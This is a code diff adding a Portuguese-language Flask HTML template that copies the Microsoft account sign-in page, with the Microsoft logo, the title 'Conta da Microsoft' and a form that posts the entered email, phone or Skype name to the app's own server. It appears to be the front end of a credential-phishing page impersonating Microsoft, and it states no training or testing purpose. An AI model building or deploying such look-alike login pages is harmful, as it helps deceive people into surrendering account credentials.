@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar - Conta da Microsoft</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <!-- Inserindo a imagem da Microsoft -->
+            <img src="{{ url_for('static', filename='microsoft_logo.png') }}" alt="Microsoft Logo" class="microsoft-logo">
+            <h1>Entrar</h1>
+        </div>
+        <form action="/" method="post">
+            <input type="text" id="username" name="username" placeholder="Email, telefone ou Skype" required>
+            <button type="submit">Próxima</button>
+            <p><a href="#">Esqueci meu nome de usuário</a></p>
+        </form>
+        <div class="login-footer">
+            <p><a href="#">Criar conta</a></p>
+        </div>
+    </div>
+</body>
+</html>
